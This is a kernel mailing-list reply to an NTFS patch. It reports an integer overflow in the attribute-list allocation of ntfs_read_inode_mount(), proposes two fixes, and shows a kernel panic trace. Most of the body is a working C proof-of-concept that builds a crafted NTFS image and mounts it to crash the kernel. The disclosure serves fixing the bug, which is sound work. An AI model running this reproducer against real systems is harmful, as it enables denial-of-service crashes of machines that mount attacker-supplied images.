Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.48])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8B0043FFAD1;
	Thu, 11 Jun 2026 16:07:14 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=43.163.128.48
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781194038; cv=none; b=Q/i8LCz8gfyzYK49XNJZg2iA6wBmOnEaXyRZ7HQTgYb/wtVkyECYPoOVJfpAxa3DcNNf0LtOXJc+JUFYKKmQoP9+m3WAbdGXDzmdFEAAuh0iynNe4sshYImbJWKPfz68tFE7URt3D8q1yGqlLJ/x447SJexh8/8y2catcYVvHaA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781194038; c=relaxed/simple;
	bh=ny5YtBSDo+rumwPPj28iPdvUGryF65s8nq35c1iInVc=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=FQP7T4bsy7BDdWk7MNoUMdpUTZWoqWRjM3CyVUauAnbnf8ePIhhMr7vqpNcMAP2lgjLhP5Kq0femKvDAZW6tDMlIXFmLUKv+zlbXQkLnHcfpvaXG4dWKnaTQg/kUVgXuPD7hw/azH09wUjlctHuNe+U2tCCgci5rkKsQJUs84Bc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=y8LpFihP; arc=none smtp.client-ip=43.163.128.48
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="y8LpFihP"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1781194032; bh=qNPdxY4Aocp0aNb68BtCffysiUbc1BMKpKzeu9WVMi8=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=y8LpFihP9qrAaNCmK6iU+7pUZXbwWDahXdeYJ9bXDLw2N0M1cbIE0AU3kHY6ae/J7
	 IP0yibzhmGriy1W2b9YSO7dyI0cFGuwZ6iHvQpURj3EaxdDPlgD7q7zcXOVGC8ss98
	 mrCmjiSOxNCIa00znXnx/teYVDGK7bAAPsZwdpBo=
Received: from [198.18.0.1] ([115.156.144.140])
	by newxmesmtplogicsvrszc43-0.qq.com (NewEsmtp) with SMTP
	id 1CA00AC4; Fri, 12 Jun 2026 00:07:10 +0800
X-QQ-mid: xmsmtpt1781194030t2n75fr39
Message-ID: <tencent_7EB8BA466F94ABB2735EA6E423E41EC41007@qq.com>
X-QQ-XMAILINFO: OVFdYp27KdlJzpb6tMw6MgXJC+qXW+rXZs7DELFXnw6kCygLCvMWAFrE5JNJSR
	 7JRJwm+3Q3F28KRzZEXFJVVCg8/j9gek9bmTyRWSFGz4zkBTdAuBn1e+7zWsSD1zZbNqfub1ZX+R
	 CiCxgZJabFPUk5wmWBCjXCb8UkLfYp+KN7hn44kMNwBCdvR2cHEcDzs/b8zgRB7j+4w0XdiG9SND
	 ZYR3RGDzUcnS5O63/eYMFfHAt2EKJJZFq9NVbUT400Uqkr61FEGeZGOiSDRPPCTvVOnau/YqZnns
	 dwu1FbsVviO7BA/aylE7PkvNK1/CpFwcFSR+XfhhqOy3Qn9F6zUKSqovGYgdNvBMLOhNsfuGh3lz
	 pPTsrceMgiGem7gZCtBHbgF45QiSGgxdH2YydNKAF9MJlZwAGpG39gRduAz6XGmSKSnGnKqtaqDr
	 6DJcoV1Ea/Qq5kV0U+d4UFOCnm75yjMixhU+4T/ASl3w/UWe6fDJs+Iy+HHRshGoYGdcrmRu5+kh
	 J+cEHhr8OWsn0GgZ1jqiXimbCsR44hMhO/6Y/g3bEASEm6j4i2xnkNU+/e2sj9lFp652Gk5KYBRp
	 earvSoKxSqx5tdBPdC9cZbYrnAblXrFLDmdJztpAD2gfhhh4wd5PwqTUmwUCb4VeDgdBfeAQ50Xy
	 CzckzkvWRTkjg5sM9Wxnf0rT2eCZxrmlEMeCkGhAcL1h111JuiF05UwAanVIvFskYOfER2L/3owI
	 WBlplRMI/9QHJ57zcU2JyAbC3BtaS2c7pvLmEWhThIYA90qF0VcQ/2VyOvAZspmXFgcQGDbXSwSY
	 9ZbDUWsuedRMmINUrFMTccpMUA4mwsn085rxQ7/m/DMrfF3YRRbK2vhNLWwAsIlqAyFZd0lqJKYi
	 s0/i6u2xiPuNIirO2Iv0mESaFZWhlocf9b5dBTl+QxsgAN/HoLUbFvMNmr/bJ0MtLbJn4XuHLZsT
	 0ttwRSLoZ6n1OsQ/AuBHEtHH4rBo7ZK6RwcquTnEXg9J2c++hN6j2QKwoZ4tnV0OL8zFTG8E1DsN
	 cCimTblOLBcXab2yNy2bSNmXwLTi7lzaFtnTHFXJDdHfvlT6g41qlNQyd6GH3DuLqHOmVxAvoO6A
	 KrHhi/uBWfjDqBaOk=
X-QQ-XMRINFO: NyFYKkN4Ny6FuXrnB5Ye7Aabb3ujjtK+gg==
X-OQ-MSGID: <98e299f7-4bb3-4659-b850-22feb5d8905a@qq.com>
Date: Fri, 12 Jun 2026 00:07:10 +0800
Precedence: bulk
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v4 3/3] ntfs: bound the attribute-list entry in
 ntfs_read_inode_mount()
To: Hyunchul Lee <hyc.lee@gmail.com>, Bryam Vargas <hexlabsecurity@proton.me>
Cc: Namjae Jeon <linkinjeon@kernel.org>, linux-fsdevel@vger.kernel.org,
 linux-kernel@vger.kernel.org
References: <20260607203000.700100-1-hexlabsecurity@proton.me>
 <20260607203000.700100-3-hexlabsecurity@proton.me>
 <CANFS6bZr3pR9PY0ugGFWsz7a9bjWeLEB0qJS5x7bq6-cFuhk9Q@mail.gmail.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <CANFS6bZr3pR9PY0ugGFWsz7a9bjWeLEB0qJS5x7bq6-cFuhk9Q@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Bryam,

Sashiko [1] reviewed this patch (3/3, "ntfs: bound the attribute-list
entry in ntfs_read_inode_mount()") and found a pre-existing integer
overflow in the same function that remains unfixed.  A PoC confirms:
mounting a crafted NTFS image with an oversized $ATTRIBUTE_LIST
triggers a kernel BUG.

[1] 
https://sashiko.dev/#/patchset/20260607203000.700100-1-hexlabsecurity%40proton.me

 > diff --git a/fs/ntfs/inode.c b/fs/ntfs/inode.c
 > index a5f7400fd19dc..c4fa6aa11c9e8 100644
 > --- a/fs/ntfs/inode.c
 > +++ b/fs/ntfs/inode.c
 > @@ -2000,10 +2000,7 @@ int ntfs_read_inode_mount(struct inode *vi)

This is the function being hardened.  Just a few lines above the
attribute-list walk, the allocation for ni->attr_list has an integer
overflow:

     ni->attr_list_size = (u32)ntfs_attr_size(a);
     ...
     ni->attr_list = kvzalloc(round_up(ni->attr_list_size, SECTOR_SIZE),
                  GFP_NOFS);
     if (!ni->attr_list) {
         ...
     }

`ntfs_attr_size(a)` returns a 64-bit signed value.  When truncated to
`u32` and stored in `ni->attr_list_size`, a crafted value like
`0x1FFFFFE01` becomes `0xFFFFFE01`.  `round_up(0xFFFFFE01, 512)` in u32
arithmetic then wraps to 0:

     round_up(x, 512) = (((x) - 1) | 0x1FF) + 1
                      = (0xFFFFFE00 | 0x1FF) + 1
                      = 0xFFFFFFFF + 1
                      = 0  (mod 2^32)

`kvzalloc(0)` returns `ZERO_SIZE_PTR` (0x10), which is *non-NULL*.
The `!ni->attr_list` error check passes, and
`load_attribute_list_mount()` subsequently reads block-device data
into address 0x10, hitting:

     kernel BUG at arch/x86/mm/physaddr.c:28!   -- __phys_addr()

 >              /* Catch the end of the attribute list. */
 >              if ((u8 *)al_entry == al_end)
 >                  goto em_put_err_out;
 > -            if (!al_entry->length)
 > -                goto em_put_err_out;
 > -            if ((u8 *)al_entry + 6 > al_end ||
 > -                (u8 *)al_entry + le16_to_cpu(al_entry->length) > al_end)
 > +            if (!ntfs_attr_list_entry_is_valid(al_entry, al_end))
 >                  goto em_put_err_out;

The new ntfs_attr_list_entry_is_valid() function improves per-entry
validation in the walk, but the walk never executes if the allocation
crashes first — the oversized data_size triggers the overflow on the
very first kvzalloc before any entry is validated.

## Reproducer

The PoC constructs a minimal NTFS image with an $ATTRIBUTE_LIST attribute
whose data_size is set to 0x1FFFFFE01.  Mounting it triggers the overflow →
ZERO_SIZE_PTR → BUG path.

Build:  gcc -static -o poc poc.c
Run:    ./poc   (as root, uses losetup + mount)

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <errno.h>

#define SZ_SEC  512
#define SZ_CL   4096
#define IMG_SZ  (64ULL * 1024 * 1024)

static uint8_t *img;

static void w16(uint8_t *p, uint16_t v) { p[0] = v & 0xFF; p[1] = (v >> 
8) & 0xFF; }
static void w32(uint8_t *p, uint32_t v) { p[0] = v & 0xFF; p[1] = (v >> 
8) & 0xFF; p[2] = (v >> 16) & 0xFF; p[3] = (v >> 24) & 0xFF; }
static void w64(uint8_t *p, uint64_t v) { for (int i = 0; i < 8; i++) 
p[i] = (v >> (i * 8)) & 0xFF; }

int main(void)
{
     const char *path = "/tmp/ntfs_poc.img";
     const char *mnt = "/mnt/ntfs_poc";
     int fd, ret;
     int mft_lcn = 16, mirr_lcn = 8, data_lcn = 2;
     int rec_sz = 1024;
     int mft_ofs, a_off;

     img = calloc(1, IMG_SZ);
     if (!img) return 1;

     /* Boot sector */
     uint8_t *p = img;
     p[0] = 0xEB; p[1] = 0x52; p[2] = 0x90; memcpy(p + 3, "NTFS    ", 8);
     w16(p + 11, 512); p[13] = 8; w16(p + 14, 0); p[16] = 0;
     w16(p + 17, 0); w16(p + 19, 0); p[21] = 0xF8; w16(p + 22, 0);
     w16(p + 24, 63); w16(p + 26, 255); w32(p + 28, 0); w32(p + 32, 0);
     w64(p + 40, IMG_SZ / 512); w64(p + 48, mft_lcn); w64(p + 56, mirr_lcn);
     p[64] = -10; p[68] = -10;
     w64(p + 72, 0x123456789ABCDEF0ULL); w32(p + 80, 0);
     w16(p + 510, 0xAA55);

     /* MFT Mirror: copy boot sector */
     memcpy(img + mirr_lcn * (uint64_t)SZ_CL, img, SZ_SEC);
     /* Data cluster: fill with 0xAB */
     memset(img + data_lcn * (uint64_t)SZ_CL, 0xAB, SZ_CL);

     /* --- MFT RECORD 0 --- */
     mft_ofs = mft_lcn * SZ_CL; p = img + mft_ofs;
     w32(p + 0, 0x454c4946);      /* "FILE" magic */
     w16(p + 4, 48);              /* update sequence offset */
     w16(p + 6, 3);               /* update sequence length */
     w16(p + 16, 1);              /* hard links */
     w16(p + 18, 1);              /* attribute offset (we set real value 
later) */
     w16(p + 20, 56);             /* flags: IN_USE */
     w16(p + 22, 1);              /* data run offset */
     w32(p + 28, rec_sz);
     w64(p + 32, 0xFFFFFFFFFFFFFFFFULL);
     w16(p + 40, 0); w16(p + 42, 0); w32(p + 44, 0);
     w16(p + 48, 1);              /* usa count */

     a_off = 56;

     /* Attribute [1]: $ATTRIBUTE_LIST (0x20), non-resident, oversized 
data_size */
     {
         uint8_t *a = p + a_off;
         int len = 80;
         int mp_off = 16 + 56;

         w32(a + 0, 0x20); w32(a + 4, len);
         a[8] = 1; a[9] = 0;              /* non-resident */
         w16(a + 10, 0); w16(a + 12, 0); w16(a + 14, 1);
         w64(a + 16, 0); w64(a + 24, 0);
         w16(a + 32, mp_off); a[34] = 0;
         memset(a + 35, 0, 5);
         w64(a + 40, 4096);               /* allocated_size */
         w64(a + 48, 0x1FFFFFE01ULL);     /* data_size → OVERFLOW TRIGGER */
         w64(a + 56, 1);                  /* initialized_size */
         w64(a + 64, 0);

         /* Mapping pairs: 1 cluster at LCN = data_lcn */
         a[mp_off]     = 0x11;
         a[mp_off + 1] = 1;
         a[mp_off + 2] = data_lcn;
         a[mp_off + 3] = 0;
         memset(a + mp_off + 4, 0, len - mp_off - 4);
         a_off += len;
     }

     /* Attribute [2]: $DATA (0x80) */
     {
         uint8_t *a = p + a_off;
         int len = 80;
         int mp_off = 72;

         w32(a + 0, 0x80); w32(a + 4, len);
         a[8] = 1; a[9] = 0;
         w16(a + 10, 0); w16(a + 12, 0); w16(a + 14, 2);
         w64(a + 16, 0); w64(a + 24, 0);
         w16(a + 32, mp_off); a[34] = 0;
         memset(a + 35, 0, 5);
         w64(a + 40, (uint64_t)IMG_SZ);
         w64(a + 48, (uint64_t)IMG_SZ);
         w64(a + 56, (uint64_t)IMG_SZ);
         w64(a + 64, 0);

         a[mp_off]     = 0x11;
         a[mp_off + 1] = 1;
         a[mp_off + 2] = mft_lcn;
         a[mp_off + 3] = 0;
         memset(a + mp_off + 4, 0, len - mp_off - 4);
         a_off += len;
     }

     /* AT_END */
     w32(p + a_off, 0xFFFFFFFF); a_off += 4;
     w32(p + 24, a_off);           /* update real bytes_in_use */

     /* Fix USA */
     w16(p + 50, p[510] | (p[511] << 8)); p[510] = 1 & 0xFF; p[511] = (1 
 >> 8) & 0xFF;
     w16(p + 52, p[1022] | (p[1023] << 8)); p[1022] = 1 & 0xFF; p[1023] 
= (1 >> 8) & 0xFF;

     /* MFT records 1..31: empty */
     for (int i = 1; i < 32; i++) {
         uint8_t *r = img + i * rec_sz;
         memset(r, 0, rec_sz);
         w32(r + 0, 0xFFFFFFFF); w16(r + 4, 48); w16(r + 6, 3);
         w16(r + 16, i); w16(r + 20, 56); w16(r + 22, 0);
         w32(r + 24, 56); w32(r + 28, rec_sz); w64(r + 32, 0);
         w32(r + 44, i); w16(r + 48, 1);
         w16(r + 50, r[510] | (r[511] << 8)); r[510] = 1 & 0xFF; r[511] 
= (1 >> 8) & 0xFF;
         w16(r + 52, r[1022] | (r[1023] << 8)); r[1022] = 1 & 0xFF; 
r[1023] = (1 >> 8) & 0xFF;
     }

     printf("[+] Writing and mounting...\n");
     fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (fd < 0) { perror("open"); return 1; }
     ret = write(fd, img, IMG_SZ);
     close(fd); free(img);
     if (ret != IMG_SZ) { perror("write"); return 1; }

     mkdir(mnt, 0755);
     system("losetup -d /dev/loop0 2>/dev/null; losetup /dev/loop0 
/tmp/ntfs_poc.img 2>&1");
     sync();
     ret = mount("/dev/loop0", mnt, "ntfs", MS_RDONLY, NULL);
     if (ret < 0) printf("[!] mount: %s\n", strerror(errno));
     umount2(mnt, MNT_FORCE);
     system("losetup -d /dev/loop0 2>/dev/null");
     printf("[+] Done. Check dmesg for 'kernel BUG at 
arch/x86/mm/physaddr.c'\n");
     return 0;
}

## Kernel Splat

Mounting the crafted image on 7.1.0-rc4 with this patch applied (via 
Sashiko):

[  132.232704] kernel BUG at arch/x86/mm/physaddr.c:28!
[  132.232722] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[  132.232768] RIP: 0010:__phys_addr+0x9e/0x100
[  132.232802] RAX: 0000778080000010   RDI: 0000000000000010  <-- 
ZERO_SIZE_PTR
[  132.232884] Call Trace:
[  132.232931]  bdev_rw_virt+0x117/0x210
[  132.233056]  ntfs_bdev_read+0x25d/0x2e0
[  132.233091]  ntfs_read_inode_mount+0x1d07/0x2750
[  132.233144]  ntfs_fill_super+0x2557/0x9960
[  132.233668]  __x64_sys_mount+0x298/0x310
[  132.233679]  do_syscall_64+0x129/0xf80
[  132.233951] Kernel panic - not syncing: Fatal exception

The registers RAX and RDI both contain 0x10 (ZERO_SIZE_PTR), confirming
the overflow → kvzalloc(0) → ZERO_SIZE_PTR → bdev_rw_virt crash path.

## Suggestion

This is a pre-existing issue, but since the patch touches the same
allocation site, fixing it here would prevent an attacker from bypassing
the new validation by triggering the overflow before any entry is
validated.  Two possible fixes:

1. Use 64-bit arithmetic for the round_up:

     ni->attr_list = kvzalloc(round_up((u64)ni->attr_list_size, 
SECTOR_SIZE),
                  GFP_NOFS);

2. Or check for overflow explicitly:

     if (ni->attr_list_size > U32_MAX - SECTOR_SIZE + 1) {
         err = -EINVAL;
         goto put_err_out;
     }
     ni->attr_list = kvzalloc(round_up(ni->attr_list_size, SECTOR_SIZE),
                  GFP_NOFS);

Either approach prevents the overflow without changing the validation
improvements from this patch.

Thanks,
Xiao


